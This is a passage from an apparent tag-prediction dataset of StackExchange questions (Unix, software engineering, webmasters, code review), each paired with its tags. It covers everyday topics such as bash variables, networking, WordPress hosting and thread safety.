    "source": "Save command string into bash variable <eos> I'm running a command like so, with the $OUTPUT variable saving the results of the command. But I also want to save the command itself to a variable for inclusion in a status email.OUTPUT=$(php -f $LOCATION/somefile.php -- -process $INPUTFILE 2>&1)The first part works. Then I tried this:IMPORTCOMMAND='php -f' $LOCATION'/somefile.php -- -process'$INPUTFILEBut instead of saving the string to the variable, it seems to be just executing the command a second time.EDIT:Here is a mockup of how I create my email body. I have single quotes around regular strings and then double quotes around bash variables.BODY='<b color=red>Output:</b><br />'$OUTPUT'<b color=red>Command:</b> '$IMPORTCOMMANDAfter that I try to replace newlines with html  like so:BODY=${BODY//$'\\n'/<br />}#changed $BODY= to BODY= per yaegashi's suggestionThe following error disappeared after I followed yaegashi's suggestion:/usr/local/bin/some-script.sh: line 59: <b: command not foundBut the original error remains, at the IMPORTCOMMAND variable assignment.",
    "target": "shell script"
  },
  {
    "id": "_unix.319825",
    "source": "How to configure an application to be started in full screen mode? <eos> I can find a similar topic:How to configure certain programs to always open in full screen?, but it does not solve my question.I wonder which aspect the question is related to, the distro, or the desktop session? I use the Fedora and Gnome 3.",
    "target": "fedora;fullscreen"
  },
  {
    "id": "_cogsci.16987",
    "source": "Classification of EEG Signals <eos> I am working on a project related to Brain-Computer Interface & I came across this problem.What are the tools and techniques used to classify the EEG signals which are extracted from the Neurosky Mindwave Mobile Headset. I just needed the birds eye view of what are techniques used. Obviously the signal which are extracted using the electrode contains all the EEG signals present in the EEG spectrum (alpha,beta,gamma etc) normally, so how can I classify it?I read about some of them like  using FFT and extraction of band powers but I didn't understand it quite well so can someone please tell me how it is done.I really appreciate your help.Thank You.",
    "target": "theoretical neuroscience;eeg;brain training;brain computer interface;brain waves"
  },
  {
    "id": "_unix.345433",
    "source": "Add specific word to each line <eos> I have a file like herefile.txtbbb-ccc-cccc#   aasdf  asdas asdasa fgdg   asdfa  asfdas  adfaq  asfa   afdaf  fafa  fafd  afafabbb-ccc-cccc#I want to take the word ending in # and I want to add it to each line as the first word. I am a beginner at unix scripting.sed 's/bbb-ccc-cccc#/^/' < file.txt > newfile.txtI don't know the word before # sign ahead of time, so my point is find the word ending with # and put it at the beginning of each line. For this file.txt I need like here:bbb-ccc-cccc#bbb-ccc-cccc#   aasdf  asdas asdasa fgdgbbb-ccc-cccc#   asdfa  asfdas  adfaq  asfabbb-ccc-cccc#   afdaf  fafa  fafd  afafabbb-ccc-cccc#",
    "target": "text processing;sed"
  },
  {
    "id": "_cstheory.27235",
    "source": "The Arrow of Time in a Non-Physical Realm <eos> Could there be a logically consistent theory supporting the transmission of non-physical information to a point in time previous to the time it was sent using a computer network (quantum theory, etc)? I'm working on a sci-fi story and need some legit science to back up just such an occurrence - so there's no limit re: real world application.",
    "target": "soft question;quantum information;physics;ni.networking internet"
  },
  {
    "id": "_unix.314890",
    "source": "What is the text command for naming a window in gnu-screen? <eos> I have created a long running screen session with many windows and the C-a A command to rename a window is not working. What is the text command for renaming a window?I have tried :caption string windowname but it doesn't work. Is that the right command or am I missing something?",
    "target": "gnu screen;window title"
  },
  {
    "id": "_unix.350397",
    "source": "Static IP Some other host already uses address  <eos> Hello I'm trying to set up a static ip on a minimal install vm with the IP of the vm is 170.20.x.100 but when I configure the/etc/sysconfig/network-scripts/ifcfg-eth0 file to have an IPADDR of 172.20.x.100 and I restart the network with systemctl I get an error saying Error, some other host already uses address 172.20.x.100 and when I change the ip to any other value the ip does resolve and it validates I have checked all of the other hosts on my network and none has that ip on any interface. Although I did find a file on the main host called /etc/sysconfig/network-scripts/ifcfg-br1 and it does have the ip of 172.20.x.100 in the IPADDR field, but when I do ifconfig on the interface it does not show that ip instead it shows 172.20.x.1 which is the correct address, I'm using my main hosts as the gateway of my network. This is also a cloned VM and I have been encountering several issues before. I couldn't ping my gateway before because the MAC address of the virtual machine and the MAC of ifcfg-eth0 filewere different but I changed it to the MAC Virt-Manager gave me and it worked. Now the only issue is getting my vm to obtain 172.20.x.100 as the ip address. Are you familiar with this issue?UPDATEIt seems like the issue is still the MAC address. When I issue arping -c 2 -w 3 -D -I eth0 172.20.x.100 The reply is Unicast reply from 172.20.x.100 from 0.0.0.0 eth0Unicast reply from 172.20.x.100 [ 52:54:00:D0:5D:3A ] but when I go ifconfig eth0 on the vm the MAC is 52:54:00:4b:c2:30Static configuration of vm /etc/sysconfig/network-script/ifcfg-eth0 DEVICE=eth0ONBOOT=yesBOOTPROTO=staticNETMASK=255.255.255.0IPADDR=172.20.x.100GATEWAY=172.20.x.1DNS1=172.20.x.1DNS2=8.8.8.8HWADDR=52:54:00:4b:c2:30PEERDNS=yesTYPE=EthernetIPV6INIT=noIfconfig on main host: eno1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500        inet 10.40.84.195  netmask 255.255.255.0  broadcast 10.40.84.255        inet6 fe80::d4de:7ab0:3cf4:e2ca  prefixlen 64  scopeid 0x20<link>        ether ec:b1:d7:38:c7:07  txqueuelen 1000  (Ethernet)        RX packets 162478  bytes 70643148 (67.3 MiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 37498  bytes 6406695 (6.1 MiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0        device interrupt 20  memory 0xef100000-ef120000  lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        inet6 ::1  prefixlen 128  scopeid 0x10<host>        loop  txqueuelen 1  (Local Loopback)        RX packets 189  bytes 21522 (21.0 KiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 189  bytes 21522 (21.0 KiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0virbr0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500        inet 192.168.51.1  netmask 255.255.255.0  broadcast 192.168.51.255        ether 52:54:00:7b:f7:52  txqueuelen 1000  (Ethernet)        RX packets 34  bytes 1948 (1.9 KiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 6  bytes 2374 (2.3 KiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0virbr1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500        inet 172.20.x.1  netmask 255.255.255.0  broadcast 172.20.x.255        ether 52:54:00:d0:5d:3a  txqueuelen 1000  (Ethernet)        RX packets 664  bytes 91395 (89.2 KiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 397  bytes 493153 (481.5 KiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0Content of br1: DEVICE=br1ONBOOT=yesTYPE=BridgeBOOTPROTO=noneIPADDR=172.20.x.100GATEWAY=172.20.x.1STP=onDELAY=0.0Error Message of VM:",
    "target": "centos;networking;network interface"
  },
  {
    "id": "_webmaster.935",
    "source": "Multi site wordpress setup <eos> Currently my company has 3 blogs and what I did was to install three instances of wordpress over Apache/MySQL, in different directories. The problem is that I have a Slicehost VPS with 256Mb RAM with Ubuntu8.04 and MySQL is crashing Linux or making it very slow and unresponsive. Is there some kind of optimal setup for this scenario? I know that my server is too cheap but I'm not sure either if an upgrade to 512 will fix things.I'm thinking about migrating to nginx, but what about MySQL? Is there any solution to this? Is this the right site to post this question or is it serverfault?Thanks",
    "target": "wordpress;mysql;nginx"
  },
  {
    "id": "_unix.268583",
    "source": "is it possible to connect android mobile app , wifi router and a wifi device? <eos> i'm trying to establish a communication between android mobile app , wifi router and a wifi device how can i do it?here wifi device is home built and it is connected to the router and both are static(router and device) only the android mobile is roaming .EX: when you send a msg through whatsapp first it goes to whatsap server --> router(identifing ur ip addr) --> 2nd android device .here is there any way to remove/replace with any other thing intermediate server so that i can send signal to my home built wifi device via router sitting anywhere in the country .suggestions are accepted.Thanks. MORE INFO: message is nothing but ON/OFF signal of one or more divice. ",
    "target": "android"
  },
  {
    "id": "_cs.67673",
    "source": "solving simple hyperbolic DE <eos> In a related post: Algorithm for solving binary quadratic Diophantine equations (BQDE) and its CTC there was a conclusion that with regard to general binary quadratic diophantine equation (with all non-zero coefficients), the solutions (if existent) can be found in exponential time. However, is this also the case for simple hyperbolic case (i.e. where $A$ and $C$ are zero, leading to form: $Bxy + Dx + Ey + F = 0$)? Alpertron (https://www.alpertron.com.ar/METHODS.HTM) shows a method for such a case which involves finding all integer divisors of $DE-BF$ - a task which can be tricky for large coefficients. For certain, sufficiently large coefficients Alpertron's method would imply that this can be computed in sub-exponential time (using GNFS).Is there any algorithm to be used for SHCDE which would find the solutions in less than exponential time (unlike standard ones for general BQDE)?",
    "target": "algorithms;complexity theory"
  },
  {
    "id": "_unix.35447",
    "source": "VM benchmark tools? <eos> I would like to benchmark of few XEN-constallations:PV DomUHVM DomU with PV network and disk driversHVM DomU with emulated IDE and PV networkThe base will be the same VM with the same disk/cpu/os/network setup based on the same original PV clone.I am especially interested in specific VM numbers:For CPU: Ability to switch process context (cs per second?)For Memory: Pure RAM-memory throughput read/writeFor Disk: latency of read/write operationsFor Network: Ability to handle many small packets at the same timeIs there a good (free) linux tool to test these?Is there a specific benchmark covering virtual machines?I am NOT interested inCPU speed benchmark (calculations)Disk transfer rateNetwork bandwidth utilization",
    "target": "linux;xen;virtualization;benchmark"
  },
  {
    "id": "_softwareengineering.319045",
    "source": "How to facilitate thread-safe access to large set of shared variables? <eos> I have 2 sets--inputs and outputs--of 70 32-bit integer variables and 70 bools (140 vars altogether). These need to be accessed and modified from 3 threads. What is an appropriate design pattern to facilitate thread-safe read-write access to each of these 140 variables without locking all of them under a single mutex (which I expect will result in bad performance)?Some details about the performance requirements:Thread 1 (CAN Serial Communication) receives packets from hardware sensors every 1ms that contain the updated value for one of the 70 input shared variables; the thread updates the variable with that value. Also, every 5ms Thread 1 needs to make a copy of all the 70 output variables.Thread 2 (Controller) creates a copy of all input variables every 10ms, as well as overwrites all the output variables.Thread 3 (GUI) makes a copy of all input and output variables every 500ms.The system runs on an ARM Cortex-A8 600Mhz.One solution is to create a mutex lock for each of the 140 variables, but this feels like a hack. I would then wrap the variables in a class with 140 getters and setters, which also seems ugly.A side-note about std::atomic:The other alternative is std::atomic. But I feel it is an advanced and complicated feature, for example I was told on IRC that the following example snippet is not thread-safe, despite looking intuitively like it should be:typedef struct MyStruct {        std::atomic<int> a;        std::atomic<int> b;}std::atomic<MyStruct> atomic_struct;atomic_struct.a = 1;atomic_struct.b = 2;// Make a copy of `atomic_struct`Mystruct normal_struct;normal_struct = atomic_struct;// Edit the values of the copied struct and copy the changes back to the `atomic_struct`.normal_struct.a = 100;normal_struct.b = 200;atomic_struct = normal_struct;",
    "target": "c++;performance;multithreading;qt"
  },
  {
    "id": "_unix.19681",
    "source": "Open Sakura in home directory <eos> Possible Duplicate:Open Sakura in home directory I love XTerm but I would like to enable tabbing (multiple terminals in one window separated by tabs).The terminal Sakura is based on XTerm and tabbing is enabled.I can open XTerm in my home directory by executing xterm -e 'cd ~/ && /bin/bash'. However, this doesn't work with Sakura (I replaced xterm by sakura).I also tried sakura -e 'cd ~/' but it doesn't work either.Any ideas would be very much appreciated.Thanks!",
    "target": "terminal"
  },
  {
    "id": "_softwareengineering.230778",
    "source": "Should I consider loosely-coupling for class methods as well? <eos> I'm a fan of Dependency Injection, however I don't know how much both public and private methods inside a class should be loosely-coupled.Just to picture it better, when I have both projectId and userId as private properties in my class, and both of them have their own decent setter methods which will do the input validation also -- throwing an error in case of unexpected input, then isn't it better that all the class' methods relies on these properties instead of getting them via method arguments' and repeat the whole validation, etc. again?In this case the methods will tightly-bind to the class itself -- and probably the constructor as well, but the advantage is that all the methods can easily rely on the setter methods and they will always assume also that the proper data is always available for me to process -- because the setter should have thrown an exception otherwise.This seems quite helpful to me and I can make all the classes and libraries loosely-coupled in a way they don't depend to each other, however my question is, can a method inside a class be dependent on the class properties itself or not? Is it considered as a bad-practice?",
    "target": "design;object oriented;dependency injection"
  },
  {
    "id": "_webmaster.108234",
    "source": "How to emulate a Google local search query? <eos> There must be a way, since services such as RankTrackr.com and WhiteSpark can get pretty accurate results?Is there some sort of parameters I can add to the URL to emulate a local search for a particular city in the United States?",
    "target": "seo;google search;search engines;serps;local seo"
  },
  {
    "id": "_unix.271449",
    "source": "Build custom EDID with several modelines <eos> I would like to build custom EDID using kernel sources.But I need to use several modelines - more refresh rates for same resolution.Is it possible using method in kernel sources? Could you please show me how my 1920x1080.S file should look like?",
    "target": "kernel;compiling;monitors;edid"
  },
  {
    "id": "_webapps.31059",
    "source": "Allow comments but no posts on my Facebook timeline <eos> I would like to allow people to comment on my posts on my timeline (since I post a lot of articles and things that I read, and enjoy discussing them), but I also want to prevent people from posting their own links/messages directly onto my timeline. Is this possible? ",
    "target": "facebook;facebook timeline"
  },
  {
    "id": "_unix.276406",
    "source": "What is a non-agressive way of killing a process? <eos> I want to close a program through the command line (say Firefox or Thunderbird). The program is working just fine and in theory I could just go FILE > CLOSE. However, I want to do this through the command line so that is not an option. I could kill the process (e.g. pkill firefox), but from the sound of it, that is quite a brutal way to close a program. In fact, I am used to using this as a last resort, especially when a program hangs. In all honesty, I don't know if this is a proper way of quitting a program. Is it? Or are there better ways of closing a program?",
    "target": "kill"
  },
  {
    "id": "_cstheory.10728",
    "source": "Running a BPP algorithm with a half-random, half-adversarial string <eos> Consider the following model: an n-bit string r=r1...rn is chosen uniformly at random.  Next, each index i{1,...,n} is put into a set A with independent probability 1/2.  Finally, an adversary is allowed, for each iA separately, to flip ri if it wants to.My question is this: can the resulting string (call it r') be used by an RP or BPP algorithm as its only source of randomness?  Assume that the adversary knows in advance the entire BPP algorithm, the string r, and the set A, and that it has unlimited computation time.  Also assume (obviously) that the BPP algorithm knows neither the adversary's flip decisions nor A.I'm well-aware that there's a long line of work on precisely this sort of question, from Umesh Vazirani's work on semi-random sources (a different but related model), to more recent work on extractors, mergers, and condensers.  So my question is simply whether any of that work yields the thing I want!  The literature on weak random sources is so large, with so many subtly-different models, that someone who knows that literature can probably save me a lot of time.  Thanks in advance!",
    "target": "cc.complexity theory;randomized algorithms;derandomization;extractors"
  },
  {
    "id": "_softwareengineering.355466",
    "source": "Why are function names decorated in C? <eos> When you compile a C source file into an object file, the function names in the object file will be decorated. Each calling convention will have a different decoration.For example, the following __stdcall function:void __stdcall stdcallFunction(int i){    int j = 12345;}Will be decorated like this in the object file:_stdcallFunction@4And the following __cdecl function:void __cdecl cdeclFunction(int i){    int j = 12345;}Will be decorated like this in the object file:_cdeclFunctionNow my question is, why is name decoration used? I mean why not have the function stdcallFunction be saved in the object file simply as stdcallFunction and not as _stdcallFunction@4?I think the reason is the following:Say I created a library (a .lib library and not a .c library) that contains the above two functions.Now I want to call the function stdcallFunction in this library from my `C source file, I would do the following:void __stdcall stdcallFunction(int i);stdcallFunction(123);This will compile fine. But if I did the following (changed the calling convention for the function declaration):void __cdecl stdcallFunction(int i);stdcallFunction(123);Then this will produce a compilation error.So the reason for using name decoration is for the compiler to make sure that I am using the correct calling convention when calling a function that exists in a library (the name decoration is simply an indication of what is the calling convention of a function in a library).Am I correct?",
    "target": "c"
  },
  {
    "id": "_webapps.85916",
    "source": "How secure is Facebook's custom search? <eos> If I share a photo album on Facebook with custom audience then will their mutual friends will be able to see those photos? I want to upload family albums and I only want only selected people to see. If a person in my custom audience comments on a post, can their friends (or our mutual friends) then see the post? (People who aren't in the custom audience.)",
    "target": "facebook;facebook privacy"
  },
  {
    "id": "_webmaster.15728",
    "source": "Site overthrown by Turkish hackers <eos> Go ahead, laugh. I forgot to remove the default admin/admin account on my blog. SOmebody got in and has replaced my homepage with some internet graffiti. I've used .htaccess to replace the page with a 403 error, but no matter what I do, my wordpress homepage is this hacker thing.How can I setup my server so that ONLY MYSELF can view it while I'm fixing this via .htaccess?What steps should I take to eradicate them from my server?If I delete the ENTIRE website and change all the passwords, is he completely gone?Thanks.",
    "target": "security;htaccess;server"
  },
  {
    "id": "_unix.289934",
    "source": "Interrupted apt upgrade broke udev and systemd <eos> During an update of my Raspbian installation (Pi rev. B+) over SSH I lost connection. After a hard reboot (which may have happened during or after finishing the update) the udev kernel device manager fails on boot.According to the journalctl (-xb), everything non-grey (white and red):systemd-udev-trigger.service: main process exited, code=killed, status=11/SEGVFailed to start udev Coldplug all Devices.Unit systemd-udev-trigger.service entered failed state.<snip>systemd-udevd.service: main process exited, code=killed, status=11/SEGVFailed to start udev Kernel Device Manager.Those last two lines are repeated a couple of times.Unit systemd-udevd.service entered failed state.The result of udev failing becomes apparent later on:random:nonblocking pool is initializedJob dev-mmcblk0p1.device/start timed out.Timed out waiting for device dev-mmcblk0p1.device.<snip>Dependency failed for /boot.<snip>Dependency failed for Local File Systems.<snip>Dependency Failed for File System Check on /dev/mmcblk0p1.<snip>Job dev-ttyAMA0.device/start timed out.Timed out waiting for device dev-ttyAMA0.device.The system is very broken at the moment. I checked the micro-SD for faults with fsck and so far without finding anything wrong.How do I repair this mess?",
    "target": "debian;package management;systemd;udev"
  },
  {
    "id": "_codereview.72087",
    "source": "Defining a certain member function <eos> Consider the following:#include <iostream>struct State { virtual ~State() = default; };struct Drunk : State {    void singWhileDrunk() {std::cout << Singing while drunk.\\n;}};struct Person {    State* state;    void singWhileDrunk() {dynamic_cast<Drunk*>(state)->singWhileDrunk();}  // Is this good?};int main() {    Person bob;    bob.state = new Drunk;    bob.singWhileDrunk();    // dynamic_cast<Drunk*>(bob.state)->singWhileDrunk();  // Using this is better?}What I wonder is if Person::singWhileDrunk() should really be defined in Person or not.  singWhileDrunk() only has true meaning if the person is drunk, so to define it in Person seems wrong to me. However, it does simplify the code in main(), especially if it is to be used a lot.(dynamic_cast<Drunk*>(bob.state)->singWhileDrunk();is clearly more typing (and may run into difficulties if I want to redefine it everywhere it is used, e.g. change dynamic_cast to static_cast).  Another issue I have is that in my program I have many different types of states, each with their own special functions, and to define them all in Person will really bloat the Person class with MANY, MANY functions that don't even seem to belong in Person.  So there seems to be pros and cons to both choices and would like to hear what others have to say about this.This is just an example of course. In reality, I have states like FlySpellState, with the function flies(), which also seems to have no place in Person (since people cannot fly normally), though it could be.",
    "target": "c++"
  },
  {
    "id": "_datascience.8697",
    "source": "about the error additivity <eos> In machine learning, one can use Euclidean distance to measure a cluster$$\\mu\\in R^k,$$ over data points $$\\{x_i\\}^N_{i=1}\\in R^{k\\times N},$$ with the measure $$\\text{error}_i = ||\\mu-x_i||^2_2$$The total error can be calculated as$$\\text{error} = \\sum^N_{i=1}error_i$$ To estimate the parameters, one formulates the optimization problem$$\\min_{\\mu_{new}} \\big{(}\\text{error}\\big{)}$$This has two underlying assumptions: first, that samples are independent, and, second, that the dimensions are independent for each sample. Can anyone explain how I should analyze when either or both assumptions are not satisfied?",
    "target": "machine learning;data mining"
  },
  {
    "id": "_softwareengineering.290903",
    "source": "Message queue vs database for delayed tasks <eos> I need to build a system that can handle a fairly high amount of delayed tasks (e.g. scheduled emails). For non-delayed tasks I would go for something like RabbitMQ. But, is it ok to let tasks lingering in the queue for extended amounts of time, like days?Would it make more sense to store the tasks in a database and then periodically check whether there are tasks which need to be processed?",
    "target": "architecture;database;message queue"
  },
  {
    "id": "_codereview.119768",
    "source": "Page for personal portfolio animations <eos> I built my portfolio page using Bootstrap and jQuery, but on lower performance computers the animations seem choppy. I am interested in JavaScript optimization and was hoping you all had some ideas on how to more efficiently execute my code. You can see it live here: bgottschling.github.io.HTML:<!DOCTYPE html><html >  <head>    <meta charset=UTF-8>    <title>Brandon Gottschling's Portfolio</title>    <meta http-equiv=X-UA-Compatible content=IE=edge>    <meta name=viewport content=width=device-width, initial-scale=1>    <!-- Font Awesome -->    <link rel=stylesheet href=https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css type='text/css'>    <!-- Font MFizz -->    <link rel=stylesheet href=http://cdn.ovispot.com/c/font-mfizz/1.2/font-mfizz.css type='text/css'>    <link rel='stylesheet prefetch' href='http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css'>    <link rel='stylesheet prefetch' href='http://cdnjs.cloudflare.com/ajax/libs/animate.css/3.2.3/animate.min.css'>    <link rel=stylesheet href=css/style.css>  </head>    <body>      <div class=container-fluid all>        <nav class=navbar navbar-default navbar-fixed-top>          <div class=container-fluid>            <!-- Brand and toggle get grouped for better mobile display -->            <div class=navbar-header>              <button type=button class=navbar-toggle collapsed data-toggle=collapse data-target=.navbar-collapse>                <span class=sr-only>Toggle Navigation</span>                <span class=icon-bar></span>                <span class=icon-bar></span>                <span class=icon-bar></span>              </button>              <a class=navbar-brand href=#1>Brandon Gottschling</a>            </div>            <!-- Collect the nav links, forms, and other content for toggling -->            <div class=collapse navbar-collapse>              <ul class=nav navbar-nav navbar-right>                <li id=home><a href=#1><span class=glyphicon glyphicon-home></span> Home</a></li>                <li id=about><a href=#2><i class=fa fa-info-circle nav-icon></i>                About</a></li>                <li id=portfolio><a href=#3><i class=fa fa-folder-open nav-icon></i>                Portfolio</a></li>                <li id=contact><a href=#4><i class=fa fa-envelope nav-icon></i>                Contact</a></li>              </ul>            </div>            <!-- /.navbar-collapse -->          </div>          <!-- /.container-fluid -->        </nav>        <br/>        <div class=row>          <div class=jumbotron home id=1>            <img class=image-border img-responsive text-center src=http://i1382.photobucket.com/albums/ah249/alyssa_marie21/facebrandon_zpsdsvir6wl.jpg alt=Brandon Gottschling in a sweater!>            <h2 class=text-center>Brandon Gottschling             </h2>            <h3 class=text-center>Full Stack Developer</h3>            <h4 class=text-center>Atlanta, Georgia</4>          </div>        </div>        <div class=row>          <div class=container well about id=2>            <h2 class=text-center title-text>About Me</h2>            <p class=>              I am very passionate about technology and how it advances us as a civilization. Currently in my career I am employed as a Product Specialist supporting a content management system at <a href=http://www.vertafore.com/>Vertafore</a>, an insurance              software company. I have life long aspirations to become a software developer. I currently use <strong>HTML5</strong>, <strong>CSS3</strong>, <strong>JavaScript</strong> and other JS frameworks like <strong>Bootstrap</strong>, <strong>JQuery</strong>,              <strong>AngularJS</strong>, <strong>ExpressJS</strong>, and <strong>NodeJS</strong>. I also have experience with <strong>MongoDB</strong>, and <strong>T-SQL</strong>. What interests me the most about the JavaScript language is that it allows              you to develop front and back-end applications all using one language. I find the MEAN stack, as they call it, practical due to the fact that you are not flipping between different languages. Not to mention its leverage of HTTP for scalability,              availability, and versatility. What I mean by this is that you can develop robust applications with next to no footprint, readily available wherever there is an internet connection and a web browser. To me, something about that seems powerful.            </p>          </div>        </div>        <div class=row>          <div class=container well portfolio id=3>            <h2 class= text-center title-text>Portfolio</h2>            <div class=row>              <div class=col-md-4>                <a href=http://codepen.io/brandon-gottschling/full/XmLvmo/ class=thumbnail target=_blank>                  <img src=http://i1382.photobucket.com/albums/ah271/Brandon_Gottschling/thumbnail1_zpsdbbhlko6.png alt= class=img-thumbnail>                  <div class=caption>                    <p>Quote-O-Matic</p>                  </div>                </a>              </div>              <div class=col-md-4>                <a href=# class=thumbnail>                  <img src=http://i1382.photobucket.com/albums/ah249/alyssa_marie21/iph_zpsrzdkhjpj.jpg alt= class=img-thumbnail>                  <div class=caption>                    <p>Project #2</p>                  </div>                </a>              </div>              <div class=col-md-4>                <a href=# class=thumbnail>                  <img src=http://i1382.photobucket.com/albums/ah249/alyssa_marie21/iph_zpsrzdkhjpj.jpg alt= class=img-thumbnail>                  <div class=caption>                    <p>Project #3</p>                  </div>                </a>              </div>              <div class=col-md-4>                <a href=# class=thumbnail>                  <img src=http://i1382.photobucket.com/albums/ah249/alyssa_marie21/iph_zpsrzdkhjpj.jpg alt= class=img-thumbnail>                  <div class=caption>                    <p>Project #4</p>                  </div>                </a>              </div>              <div class=col-md-4>                <a href=# class=thumbnail>                  <img src=http://i1382.photobucket.com/albums/ah249/alyssa_marie21/iph_zpsrzdkhjpj.jpg alt= class=img-thumbnail>                  <div class=caption>                    <p>Project #5</p>                  </div>                </a>              </div>              <div class=col-md-4>                <a href=# class=thumbnail>                  <img src=http://i1382.photobucket.com/albums/ah249/alyssa_marie21/iph_zpsrzdkhjpj.jpg alt= class=img-thumbnail>                  <div class=caption>                    <p>Porject #6</p>                  </div>                </a>              </div>            </div>          </div>          <div class=row>            <div class=container well contact id=4>             <div class= title-text text-center>               <h2>Contact Me</h2>              <h4>Let My Passion Be Your Product</h4>             </div>            <div class=row social_buttons>              <div class=col-sm-offset-1 col-md-2 text-center linkedin>                <a href=https://www.linkedin.com/in/bgottschling class=btn btn-default btn-lg center-block role=button target=_blank><i class=fa fa-linkedin></i> LinkedIn</a>              </div>              <div class=col-md-2 text-center>                <a href=https://github.com/bgottschling class=btn btn-default btn-lg center-block role=button target=_blank><i class=fa fa-github></i> Github</a>              </div>              <div class=col-md-3 text-center>                <a href=http://www.freecodecamp.com/bgottschling class=btn btn-default btn-lg center-block role=button target=_blank><i class=fa fa-fire></i> freeCodeCamp</a>              </div>              <div class=col-md-2 text-ceneter>                <a href=http://codepen.io/brandon-gottschling class=btn btn-default btn-lg center-block role=button target=_blank><i class=fa fa-codepen></i> Codepen</a>              </div>            </div>          </div>        </div>        <div class=footer>          <div class=container>            <p class=>Copyright  Brandon Gottschling 2015. All Rights Reserved</p>          </div>        </div>      </div>      <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>      <script src='http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js'></script>      <script src=js/index.js></script>    </body></html>CSS:body {  background: #A9E7F8;}.image-border {  border-radius: 50% 5% 50% 5%;  height: 15%;  width: 15%;  margin: 0 auto;}.about {  background: #A8FBAD;  font-size: 15px;  height: 100%;}.portfolio {  background: #FFD5AA;}.contact {  background: #B2B9FA;}.footer {  color: #FFFFFF;}.img-thumbnail {  max-height: 346px;  max-width: 200px;}.linkedin {  margin-left: 12%;}.title-text { margin-bottom: 3%; }JS:$(document).ready(  $(.navbar-right li).hover(    function() {      if (!$(this).hasClass('animated')) {        $(this).dequeue().stop().animate({          width: 120px        });      }    },    function() {      $(this).addClass('animated').animate({          width: 103px        }, normal, linear,        function() {          $(this).removeClass('animated').dequeue();        }      );    }  ),  $(#home).hover(    function() {      $(.home).addClass(animated bounce);    },    function() {      $(.home).removeClass(animated bounce);    }),  $(#about).hover(    function() {      $(.about).addClass(animated bounce);    },    function() {      $(.about).removeClass(animated bounce);    }),  $(#portfolio).hover(    function() {      $(.portfolio).addClass(animated bounce);    },    function() {      $(.portfolio).removeClass(animated bounce);    }),  $(#contact).hover(    function() {      $(.contact).addClass(animated bounce);    },    function() {      $(.contact).removeClass(animated bounce);    }));",
    "target": "javascript;jquery;css;html5"
  },
  {
    "id": "_unix.62227",
    "source": "Making a Linux audio recording device available on a Windows 7 PC over network <eos> I would like to use my headset's microphone both on my Linux laptop and a Windows 7 PC simultaneously, for different VoIP applications. I'm currently running Ubuntu with PulseAudio on the laptop to which the headset is connected and I've heard that there are Windows implementations of PulseAudio. Therefore it should theoretically be possible to make the microphone available over my LAN as an PCM stream.I'm asking now if someone has more detailed insights if this is actually doable with current software or opinions from people with more knowledge about the PulseAudio system if further investigation is likely to pay off. Ideas on doing it in any way without PulseAudio are also acceptable.",
    "target": "networking;audio;windows;pulseaudio"
  },
  {
    "id": "_unix.252795",
    "source": "Visudo sanity check for the whole ecosystem of included files? <eos> Is it possible to perform a visudo sanity check for a file in the context of other files included from /etc/sudoers.d?Scenario:I want to add a new file to /etc/sudoers.d the file itself is correct and it passes the visudo -c parser.It does however contain a Cmnd_Alias line which conflicts with another file in etc/sudoers.d.If moved to a /etc/sudoers.d it would break the sudo command with Alias '<name>' already defined near line error.Question:Is there any method which I could employ to check if the new file wouldn't break the sudo after placing it in sudoers.d?Or is there any method to make sudo ignore/stop processing included files if there was any error encountered?",
    "target": "sudo"
  },
  {
    "id": "_unix.387818",
    "source": "lvcreate snapshot creates a larger snapshot than the snapshot size <eos> I'm running lvcreate --size $snapshot_size --snapshot --name mdb-snap-00 /dev/vg0/mongodbto create a snapshot of our mongo partition.$snapshot_size is 362MHowever after creating it, lsblk gives menvme0n1                 259:0    0 442.4G  0 disk vg0-mongodb-real      252:1    0 221.2G  0 lvm   vg0-mongodb         252:0    0 221.2G  0 lvm  /mnt/data vg0-mdb--snap--00   252:3    0 221.2G  0 lvm  vg0-mdb--snap--00-cow 252:2    0   364M  0 lvm    vg0-mdb--snap--00   252:3    0 221.2G  0 lvmThis is an issue for me, because I'm trying to dd the snapshot pipe it to gzip and pipe that to an aws bucket but it timeouts everytime. I just learnt that this happens because it's trying to do the whole 221G disk even though the data on it and the specified snapshot size are only 362MbEditroot@ip-10-0-97-77:~# lvs  LV          VG   Attr       LSize   Pool Origin  Data%  Meta%  Move Log Cpy%Sync Convert  mdb-snap-00 vg0  swi-a-s--- 364.00m      mongodb 0.48                                     mongodb     vg0  owi-aos--- 221.15g",
    "target": "rhel;lvm"
  },
  {
    "id": "_unix.231975",
    "source": "Connect to serial, issue a command, read result, capture it and exit <eos> I have some device, connected to serial port. Actually, it is Arduino based temperature sensor. I wish to write a script, which will connect to serial port, send a command to device, receive it's answer, print it to stdout and exit.What is correct way to do this?Usually, when accessing local program, it is ok to redirect it's output. For example, this is how I read CPU temperature.datetime=$(date +%Y%m%d%H%M%S)cputemp=$(sensors atk0110-acpi-0 | sed s/CPU Temperature:[^0-9]*\\([0-9\\.]\\+\\).*/\\1/;tx;d;:x)echo $datetime\\t$cputempUnfortunately, $() relies on explicit program end, which is not the case with serial communication. Serial server always online and has no explicit sessions.Of course, I can check to line feeds. But is this correct action? May be I should write my Arduino program so that it send Ctrl-Z after each response or something?",
    "target": "serial port;serial console"
  },
  {
    "id": "_softwareengineering.208257",
